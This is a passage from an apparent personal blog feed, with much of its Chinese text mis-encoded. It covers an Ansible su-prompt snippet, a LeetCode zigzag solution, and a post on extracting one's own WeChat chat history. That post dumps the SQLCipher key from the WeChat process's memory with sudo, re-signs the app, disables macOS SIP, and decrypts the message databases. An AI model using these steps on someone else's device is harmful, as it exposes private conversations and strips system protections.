check_password_prompt(self, b_output):</span><br><span class="line">     &#x27;&#x27;&#x27; checks if the expected password prompt exists in b_output &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">     prompts = self.get_option(&#x27;prompt_l10n&#x27;) or self.SU_PROMPT_LOCALIZATIONS</span><br><span class="line">     b_password_string = b&quot;|&quot;.join((br&#x27;(\w+\&#x27;s )?&#x27; + to_bytes(p)) for p in prompts)</span><br><span class="line">     # Colon or unicode fullwidth colon</span><br><span class="line">     b_password_string = b_password_string + to_bytes(u&#x27; ?(:|ï¼š) ?&#x27;)</span><br><span class="line">     b_su_prompt_localizations_re = re.compile(b_password_string, flags=re.IGNORECASE)</span><br><span class="line">     # print(b_output.decode(&#x27;gbk&#x27;))</span><br><span class="line">     # print(bool(b_su_prompt_localizations_re.match(b_output.decode(&#x27;gbk&#x27;).encode(&#x27;utf-8&#x27;))))</span><br><span class="line">     return bool(b_su_prompt_localizations_re.match(b_output)) or bool(b_su_prompt_localizations_re.match(b_output.decode(&#x27;gbk&#x27;).encode(&#x27;utf-8&#x27;)))</span><br></pre></td></tr></table></figure><h2><span id="reference">reference</span></h2><p><a href="https://www.cnblogs.com/keerya/p/7987886.html">å‚è€ƒæ¥æº</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>LeetCode é‡åˆ·</title>
    <link href="https://disda-coding.github.io/2023/10/25/LeetCode-%E9%87%8D%E5%88%B7/"/>
    <id>https://disda-coding.github.io/2023/10/25/LeetCode-%E9%87%8D%E5%88%B7/</id>
    <published>2023-10-25T08:37:07.000Z</published>
    <updated>2023-10-25T08:47:48.169Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#leetcode">LeetCode</a><ul><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2">å­—ç¬¦ä¸²</a><ul><li><a href="#6-n-%E5%AD%97%E5%BD%A2%E5%8F%98%E6%8D%A2httpsleetcodecnproblemszigzag-conversion">6. N å­—å½¢å˜æ¢</a><ul><li><a href="#%E6%A8%A1%E6%8B%9F%E6%B3%95">æ¨¡æ‹Ÿæ³•</a></li><li><a href="#%E5%9D%90%E6%A0%87%E6%98%A0%E5%B0%84%E6%B3%95">åæ ‡æ˜ å°„æ³•</a></li></ul></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="leetcode">LeetCode</span></h1><h2><span id="å­—ç¬¦ä¸²">å­—ç¬¦ä¸²</span></h2><h3><span id="6-n-å­—å½¢å˜æ¢"></span></h3><p>å°†ä¸€ä¸ªç»™å®šå­—ç¬¦ä¸² <code>s</code> æ ¹æ®ç»™å®šçš„è¡Œæ•° <code>numRows</code> ï¼Œä»¥ä»ä¸Šå¾€ä¸‹ã€ä»å·¦åˆ°å³è¿›è¡Œ Z å­—å½¢æ’åˆ—ã€‚</p><p>æ¯”å¦‚è¾“å…¥å­—ç¬¦ä¸²ä¸º <code>&quot;PAYPALISHIRING&quot;</code> è¡Œæ•°ä¸º <code>3</code> æ—¶ï¼Œæ’åˆ—å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œä½ çš„è¾“å‡ºéœ€è¦ä»å·¦å¾€å³é€è¡Œè¯»å–ï¼Œäº§ç”Ÿå‡ºä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ï¼š<code>&quot;PAHNAPLSIIGYIR&quot;</code>ã€‚</p><p>è¯·ä½ å®ç°è¿™ä¸ªå°†å­—ç¬¦ä¸²è¿›è¡ŒæŒ‡å®šè¡Œæ•°å˜æ¢çš„å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string convert(string s, int numRows);</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 1ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;PAYPALISHIRING&quot;, numRows = 3</span><br><span class="line">è¾“å‡ºï¼š&quot;PAHNAPLSIIGYIR&quot;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;PAYPALISHIRING&quot;, numRows = 4</span><br><span class="line">è¾“å‡ºï¼š&quot;PINALSIGYAHRPI&quot;</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">P     I    N</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P     I</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 3ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;A&quot;, numRows = 1</span><br><span class="line">è¾“å‡ºï¼š&quot;A&quot; </span><br></pre></td></tr></table></figure><p><strong>æç¤ºï¼š</strong></p><ul><li><code>1 &lt;= s.length &lt;= 1000</code></li><li><code>s</code> ç”±è‹±æ–‡å­—æ¯ï¼ˆå°å†™å’Œå¤§å†™ï¼‰ã€<code>&#39;,&#39;</code> å’Œ <code>&#39;.&#39;</code> ç»„æˆ</li><li><code>1 &lt;= numRows &lt;= 1000</code></li></ul><h4><span id="æ¨¡æ‹Ÿæ³•">æ¨¡æ‹Ÿæ³•</span></h4><p><strong>æ€è·¯ï¼š</strong></p><p>é€šè¿‡æ¨¡æ‹Ÿè¿‡ç¨‹æ¥å®ç°ï¼Œä½¿ç”¨ä¸€ä¸ªflagæ¥åˆ¤æ–­è¡Œå·å˜åŒ–çš„æ–¹å‘ï¼ˆæ–¹å‘æ— éæ˜¯é€’å¢æˆ–è€…é€’å‡ï¼‰</p><ol><li>res[i] +&#x3D; cï¼š æŠŠæ¯ä¸ªå­—ç¬¦ c å¡«å…¥å¯¹åº”è¡Œ</li><li>i +&#x3D; flagï¼š æ›´æ–°å½“å‰å­—ç¬¦ c å¯¹åº”çš„è¡Œç´¢å¼•ï¼›</li><li>flag &#x3D; - flagï¼š åœ¨è¾¾åˆ° ZZZ å­—å½¢è½¬æŠ˜ç‚¹æ—¶ï¼Œæ‰§è¡Œåå‘ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">self, s: <span class="built_in">str</span>, numRows: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> numRows&lt; <span class="number">2</span>: </span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        res = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(numRows)]</span><br><span class="line">        i, flag = <span class="number">0</span>,-<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> s:</span><br><span class="line">            res[i]+=<span class="built_in">chr</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">0</span> <span class="keyword">or</span> i==numRows -<span class="number">1</span>:</span><br><span class="line">                flag=-flag</span><br><span class="line">            i+=flag</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br></pre></td></tr></table></figure><h4><span id="åæ ‡æ˜ å°„æ³•">åæ ‡æ˜ å°„æ³•</span></h4><p><strong>æ€è·¯ï¼š</strong></p><p>å‡è®¾4è¡Œ è½¬æˆNå°±æ˜¯0123210123210â€¦[è¡Œç´¢å¼•] å¾ªç¯çš„æ˜¯012321 ç”±äºNå­—å½¢å·¦ä¸Šå’Œå³ä¸‹éœ€è¦è½¬å¼¯ æ‰€ä»¥æå¤´0å»å°¾3 0123-&gt; 12 temp &#x3D; [0,1,2,3,2,1]ï¼ŒæŠŠtempå½“å°ºå­ï¼Œä¸€æ®µä¸€æ®µé‡sï¼Œå†æ˜ å°„åˆ°è¡Œæ•°å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">self, s: <span class="built_in">str</span>, numRows: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> numRows&lt; <span class="number">2</span>: </span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        ruler = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numRows)]</span><br><span class="line">        ruler += ruler[<span class="number">1</span>:-<span class="number">1</span>][::-<span class="number">1</span>]</span><br><span class="line">        res = [<span class="string">&#x27;&#x27;</span>] * numRows</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            res[ruler[i%<span class="built_in">len</span>(ruler)]] += s[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://disda-coding.github.io/categories/Algorithm/"/>
    
    
    <category term="LeetCodeï¼Œç®—æ³•" scheme="https://disda-coding.github.io/tags/LeetCode%EF%BC%8C%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>pythonå¤„ç†å¾®ä¿¡èŠå¤©è®°å½•</title>
    <link href="https://disda-coding.github.io/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/"/>
    <id>https://disda-coding.github.io/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/</id>
    <published>2023-10-22T03:17:42.000Z</published>
    <updated>2023-10-26T08:58:19.091Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#python%E5%A4%84%E7%90%86%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95">Pythonå¤„ç†èŠå¤©è®°å½•</a><ul><li><a href="#%E5%89%8D%E8%A8%80">å‰è¨€</a></li><li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">å‡†å¤‡å·¥ä½œ</a></li><li><a href="#%E5%BC%80%E5%A7%8B%E7%A0%B4%E8%A7%A3%E5%AF%86%E9%92%A5">å¼€å§‹ç ´è§£å¯†é’¥</a></li><li><a href="#%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE">æå–æ•°æ®</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86">æ•°æ®å¤„ç†</a><ul><li><a href="#%E7%94%9F%E6%88%90%E8%AF%8D%E4%BA%91%E5%9B%BE">ç”Ÿæˆè¯äº‘å›¾</a></li><li><a href="#%E8%A1%A8%E6%83%85%E5%8C%85%E7%BB%9F%E8%AE%A1">è¡¨æƒ…åŒ…ç»Ÿè®¡</a></li><li><a href="#%E6%97%B6%E9%97%B4%E5%88%86%E6%AE%B5%E8%81%8A%E5%A4%A9%E9%A2%91%E7%8E%87%E5%88%86%E6%9E%90">æ—¶é—´åˆ†æ®µèŠå¤©é¢‘ç‡åˆ†æ</a></li></ul></li><li><a href="#%E8%81%8A%E5%A4%A9%E9%A2%91%E7%8E%87%E7%83%AD%E5%9B%BE%E5%88%86%E6%9E%90">èŠå¤©é¢‘ç‡çƒ­å›¾åˆ†æ</a></li><li><a href="#lldb%E6%89%8B%E5%8A%A8%E6%96%B9%E6%B3%95%E5%8E%9F%E7%90%86">lldbæ‰‹åŠ¨æ–¹æ³•ï¼ˆåŸç†ï¼‰</a></li></ul></li></ul><!-- tocstop --><h1><span id="pythonå¤„ç†èŠå¤©è®°å½•">Pythonå¤„ç†èŠå¤©è®°å½•</span></h1><h2><span id="å‰è¨€">å‰è¨€</span></h2><p>ç»ˆäºå¿«åˆ°999çºªå¿µæ—¥äº†ï¼Œæœ¬æ¥æƒ³ç»™å®ä¹°å°æ‰‹æœºï¼Œå¯æ˜¯å®è¯´ç±³æœ‰çºªå¿µæ„ä¹‰ã€‚æœ€è¿‘åˆ·åˆ°ä¸€å¯¹å¥½çœ‹çš„ğŸ’ï¼Œä½†æ˜¯å®ƒåº—é“ºå…³é—¨å¤§å‰äº†ï¼Œåªèƒ½ä½œç½¢ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022111911128.png" alt="æˆ’æŒ‡"></p><p>æœ‰æ„ä¹‰ï¼Œæœ‰æ„ä¹‰ï¼Œä»€ä¹ˆä¸œè¥¿æ‰æœ‰æ„ä¹‰å‘¢ï¼Œåˆæ˜¯æˆ‘èƒ½äº²æ‰‹å®ç°çš„ä¸œè¥¿ï¼Œåšä¸»çµæœºä¸€åŠ¨ï¼ŒèŠå¤©è®°å½•æ˜¯æ‰¿è½½ä¸¤ä¸ªäººæƒ…æ„Ÿçš„é‡è¦æ¡¥æ¢ï¼Œå› æ­¤æˆ‘åªéœ€è¦å¯¹èŠå¤©è®°å½•è¿›è¡Œå¤„ç†ï¼Œç”Ÿæˆä¸“å±äºæˆ‘ä»¬ä¸¤ä¸ªäººçš„è¯äº‘å›¾ä¸å°±å¯ä»¥äº†ä¹ˆï¼ï¼ï¼ˆåšä¸»çš„æ‰£æ‰£èŠå¤©è®°å½•ä¹Ÿä¸€ç›´ä¿å­˜åˆ°ç°åœ¨å“¦ hiahiaï¼‰</p><h2><span id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</span></h2><p>æŸ¥äº†å¾ˆå¤šæŠ€æœ¯è·¯çº¿å’Œç›¸å…³èµ„æ–™ï¼Œå‘ç°å¾®ä¿¡æ˜¯ç”¨<em>SQLite</em>æ•°æ®åº“ä¿å­˜èŠå¤©è®°å½•çš„ï¼ŒåŒæ—¶ä½¿ç”¨SQLCipherå°è£…äº†è‡ªå·±çš„<a href="https://sspai.com/link?target=https://github.com/Tencent/wcdb">WCDB</a> æ•°æ®åº“æ¡†æ¶ï¼Œå› æ­¤åªæœ‰è·å–æ•°æ®åº“çš„å¯†é’¥æ‰èƒ½è·å–åˆ°èŠå¤©è®°å½•ï¼Œç„¶åæ‰èƒ½è¿›è¡Œæ•°æ®å¤„ç†ã€‚</p><p>é€šè¿‡é˜…è¯»ç™¾çµé¸Ÿå®‰å…¨å›¢é˜Ÿå‘å¸ƒçš„æ–‡ç« ã€Œ<a href="https://mp.weixin.qq.com/s?__biz=MzU0NzczMDg4Mg==&mid=2247483863&idx=1&sn=ae6d1069a517e0176822efad9835dbd3&chksm=fb48a57acc3f2c6c412cf96a1dececc42ec8853931386f0988b404c9df92b0d2f3d9ee8f5491&mpshare=1&scene=1&srcid=0818f2cWp0w1sgFkUmhGL4Oe&sharer_sharetime=1692294905463&sharer_shareid=92340da57488f8262c6c5e5b5e83ac2b#rd">æ‰“é€  macOS ä¸‹æœ€å¼ºçš„å¾®ä¿¡å–è¯å·¥å…·</a>ã€ï¼Œäº†è§£åˆ°äº†<a href="https://github.com/kekeimiku/PointerSearcher-X/releases/tag/v0.4.1">å¾®ä¿¡å¯†é’¥æå–</a>çš„ä»“åº“ï¼Œä¸‹è½½æœ€æ–°çš„releaseï¼Œç„¶åæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å¾®ä¿¡çš„ç‰ˆæœ¬å·ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022115130876-7946694.png" alt="å¾®ä¿¡ç‰ˆæœ¬å·"></p><p>ç„¶åè®¿é—®<a href="https://github.com/kekeimiku/dumpkey">dumpkeyé¦–é¡µ</a>æ‰¾åˆ°æˆ‘ä»¬çš„å¾®ä¿¡æ‰€å¯¹åº”çš„æ“ä½œå‘½ä»¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./dumper <span class="built_in">test</span> --pid $(pgrep WeChat |<span class="built_in">head</span> -1) --path <span class="string">&quot;WeChat+81059936@8@8@16@32@8@8@64@8@0@0&quot;</span> -n 32</span><br></pre></td></tr></table></figure><h2><span id="å¼€å§‹ç ´è§£å¯†é’¥">å¼€å§‹ç ´è§£å¯†é’¥</span></h2><p>é€šè¿‡è¾“å…¥åˆšåˆšæŸ¥è¯¢çš„ä»£ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥è§£å¯†å¯†é’¥äº†ã€‚</p><p>å•Šå“¦ï¼Œå‡ºç°äº†é”™è¯¯</p><p><code>error: OpenProcess, (os/kern) failure. code: 5</code></p><p>æ ¹æ®æç¤ºè¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo codesign --sign - --force --deep /Applications/WeChat.app</span><br></pre></td></tr></table></figure><p>æ€ä¹ˆè¿˜æ˜¯ä¸è¡Œï¼Œè¯•è¯•çœ‹å…³é—­SIPã€‚</p><p> å…³æœºï¼Œç„¶åé‡æ–°å¯åŠ¨ä½ çš„Macç”µè„‘ï¼Œåœ¨å¼€æœºæ—¶ä¸€ç›´æŒ‰ä½Command+Rè¿¸å…¥Recoveryæ¨¡å¼ã€‚M1çš„ç”µè„‘å¯ä»¥è¯•è¯•çœ‹é•¿æŒ‰ç”µæºé”®ï¼Œç„¶åç‚¹å‡»é€‰é¡¹ï¼Œè¾“å…¥å¯†ç ååœ¨å®ç”¨å·¥å…·é‡Œé¢ç‚¹å‡»ç»ˆç«¯ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/dfff50243cd94b0527e5f125c35c17c3.jpg" alt="æ¢å¤æ¨¡å¼"></p><p>åœ¨ç»ˆç«¯ä¸Šè¾“å…¥å‘½ä»¤ csrutil disableç„¶åå›è½¦ï¼Œç„¶åè¾“å…¥rebooté‡å¯å³å¯ã€‚</p><p>ç„¶åå†æ“ä½œä¸€éæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¯†é’¥</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022120804368.png" alt="å¯†é’¥"></p><p>å› ä¸ºæ˜¯16è¿›åˆ¶ï¼Œå› æ­¤éœ€è¦åœ¨å‰é¢åŠ ä¸Š0xå³</p><p><code>0x1B89B26FF2FD482E987ADD77DC4BC263D6FFA2781436466589AFCA80AAA8E6A3</code></p><p>é“›é“›é“›~é“›ï¼ï¼æˆ‘ä»¬å¾—åˆ°äº†<em>SQLite</em>çš„å¯†é’¥</p><h2><span id="æå–æ•°æ®">æå–æ•°æ®</span></h2><p>ç„¶åéšä¾¿åœ¨å¾®ä¿¡é‡Œé¢æ‰¾ä¸€å¼ å›¾ï¼Œåœ¨finderä¸­æ˜¾ç¤ºï¼Œ</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022155319319.png" alt="èŠå¤©è®°å½•"></p><p>åœ¨æ‰“å¼€çš„ Finder ä¸­ï¼Œå‘å¤–å›é€€ä¸¤å±‚ç›®å½•ï¼Œæ‰€æœ‰çš„ <code>msg_æ•°å­—.db</code> é‡Œé¢å­˜å‚¨çš„éƒ½æ˜¯èŠå¤©è®°å½•ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022155424360.png" alt="finderç›®å½•"></p><p>ä¸ºäº†èƒ½å¤Ÿæ‰“å¼€æ•°æ®åº“æ–‡ä»¶è¿›è¡Œå¯¼å‡ºæ“ä½œï¼Œéœ€è¦ä¸‹è½½ <a href="https://sspai.com/link?target=https://sqlitebrowser.org/dl/">DB Browser for SQLite </a>è¿›è¡Œæ“ä½œã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ï¼Œæˆ‘ä»¬æœ€å¥½å…³é—­å¾®ä¿¡è¿›è¡Œæ“ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨ä¸Šå›¾æ–‡ä»¶å¤¹ä¸­æ‰“å¼€ç»ˆç«¯</span></span><br><span class="line"><span class="built_in">cp</span> msg*.db ~/Desktop/Proj/wechat</span><br><span class="line"><span class="comment"># å»ºç«‹db0-db9</span></span><br><span class="line"><span class="built_in">mkdir</span> db&#123;0..9&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022164528102.png" alt="å»ºç«‹æ–‡ä»¶å¤¹"></p><p>ç„¶åä½¿ç”¨ DB Browser for SQLite ä»»æ„æ‰“å¼€ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œæ­¤å¤„æœ‰ä¸‰ä¸ªæ³¨æ„ç‚¹ï¼š</p><ol><li><p>å¯†ç ç±»å‹ï¼šé€‰æ‹©ã€ŒåŸå§‹å¯†é’¥ã€</p></li><li><p>å¯†ç ï¼Œç¬¬ä¸€ç§ä½¿ç”¨ ptrsx-dumper è·å–åˆ°çš„å¯†ç å‰é¢æ²¡æœ‰ <code>0x</code> å­—ç¬¦ï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨åŠ ä¸Šï¼Œç¬¬äºŒç§ Python è§£æå‡ºæ¥çš„å¯†ç å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚æ­¤å¤„æˆ‘å¡«å†™çš„å¯†ç å°±æ˜¯ï¼š<code>0x1B89B26FF2FD482E987ADD77DC4BC263D6FFA2781436466589AFCA80AAA8E6A3</code></p></li><li><p>åŠ å¯†è®¾ç½®ï¼šé€‰æ‹©ã€ŒSQLCipher 3 é»˜è®¤ã€</p></li></ol><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165111418.png" alt="æ•°æ®åº“è¿æ¥"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥è¿›å…¥æ•°æ®åº“äº†ï¼ï¼</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165130579.png" alt="æ•°æ®åº“å±•ç¤º"></p><p>åˆ‡æ¢åˆ°ã€Œæµè§ˆæ•°æ®ã€é€‰é¡¹ï¼Œé€šè¿‡é€‰æ‹©ä¸åŒè¡¨å°±å¯ä»¥æŸ¥çœ‹å’Œä¸åŒå¥½å‹ä¹‹é—´çš„èŠå¤©è®°å½•ï¼Œå¦‚ä¸‹æ‰€ç¤ºå°±æ˜¯ä¸€ä»½èŠå¤©è®°å½•ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165205053.png" alt="èŠå¤©è®°å½•"></p><p>ä¸‹ä¸€æ­¥æˆ‘ä»¬å°±å¯ä»¥å°†æ•°æ®å¯¼å‡ºäº†ï¼Œæ¯ä¸ªdbå¯¹åº”æ¯ä¸ªæ–‡ä»¶å¤¹ã€‚</p><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/image-20231022165414973.png" alt="å¯¼å‡ºè®°å½•"></p><p>å¯¼å‡ºåæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œå•¦ï¼ï¼</p><h2><span id="æ•°æ®å¤„ç†">æ•°æ®å¤„ç†</span></h2><p>æœ‰äº†æˆ‘ä»¬çš„jsonæ•°æ®å°±å¯ä»¥åˆ¶ä½œè¯äº‘äº†ã€‚</p><p>éœ€è¦çš„åº“å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install wordcloud matplotlib pandas jieba mplfonts imageio openpyxl numpy</span><br></pre></td></tr></table></figure><p>æœ‰äº†æ‰€æœ‰çš„èŠå¤©è®°å½•ï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¼åˆ¶ä½œè¯äº‘äº†ï¼Œå…ˆäº†è§£ä¸€ä¸‹å¯¼å‡ºJsonæ•°æ®çš„ç»“æ„</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;CompressContent&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ConBlob&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chN3eGlkX3k2OHh0MDk4NHFjczIxeglsaXV6b25nZGGAAQCYAQCgAQC4AQDIAQDQAQDwAQD4AQCIAgI=&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IntRes1&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IntRes2&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;StrRes1&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;StrRes2&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;mesDes&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;mesLocalID&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;mesSvrID&quot;</span><span class="punctuation">:</span> <span class="number">9004976427286855000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;messageType&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgContent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello world&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgCreateTime&quot;</span><span class="punctuation">:</span> <span class="number">1611106801</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;msgImgStatus&quot;</span><span 